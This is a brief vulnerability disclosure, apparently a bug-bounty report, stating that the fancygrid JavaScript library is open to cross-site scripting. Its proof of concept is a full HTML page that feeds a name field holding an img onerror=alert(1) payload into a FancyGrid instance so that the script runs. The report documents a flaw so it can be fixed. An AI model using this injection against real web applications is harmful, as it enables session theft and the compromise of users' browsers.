# Description

`fancygrid` is vulnerable to `Cross-Site Scripting (XSS)`.

# Proof of Concept
Save and execute the following file in any browser
```
<html lang="en">
<head>
  <title>fancygrid</title>
</head>
<body>
    <div id="grid"></div>
  <link href="https://cdn.fancygrid.com/fancy.min.css" rel="stylesheet">
  <script src="https://cdn.fancygrid.com/fancy.min.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function() {
     
    new FancyGrid({
      renderTo: 'grid',
      width: 300,
      height: 200,
      data: [
        {name: 'Nick"><img src=x onerror=alert(1)>', age: 30},
        {name: 'Fred', age: 25},
        {name: 'Mike', age: 35}
      ],  
      columns: [{
        index: 'name',
        title: 'Name',    
        type: 'string'
      },{
        type: 'number',
        index: 'age',
        title: 'Age'
      }]
    });
     
    });
    </script> 
</body>
</html>
```
XSS payload will get executed.
